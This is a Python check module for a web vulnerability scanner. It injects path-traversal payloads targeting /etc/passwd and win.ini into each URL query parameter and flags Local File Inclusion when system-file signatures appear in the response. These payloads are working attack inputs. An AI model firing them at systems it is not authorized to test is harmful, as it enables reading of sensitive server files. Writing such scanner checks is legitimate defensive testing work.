import urllib.parse
from wascan import fetch, Finding

async def run_check(session, target_url, config, semaphore, result):
    lfi_payloads = [
        "../../../../../../../../etc/passwd",
        "..\\..\\..\\..\\..\\..\\..\\windows\\win.ini"
    ]
    # Signatures indicating a successful system file read
    success_indicators = ["root:x:0:0", "[extensions]"]

    parsed = urllib.parse.urlparse(target_url)
    if not parsed.query:
        return

    params = urllib.parse.parse_qsl(parsed.query)
    
    for payload in lfi_payloads:
        for i in range(len(params)):
            test_params = params.copy()
            test_params[i] = (test_params[i][0], payload)
            test_query = urllib.parse.urlencode(test_params)
            test_url = parsed._replace(query=test_query).geturl()

            resp = await fetch(session, test_url, config, semaphore)
            if resp and resp.status == 200:
                body = (await resp.read()).decode(errors="ignore")
                
                if any(indicator in body for indicator in success_indicators):
                    result.add(Finding(
                        title="Local File Inclusion (LFI)",
                        severity="critical",
                        description=f"Directory traversal successful on parameter '{test_params[i][0]}'. Extracted local system files.",
                        url=test_url,
                        recommendation="Sanitize user input, avoid passing direct file paths via parameters, and use strict allow-lists."
                    ))
                    return
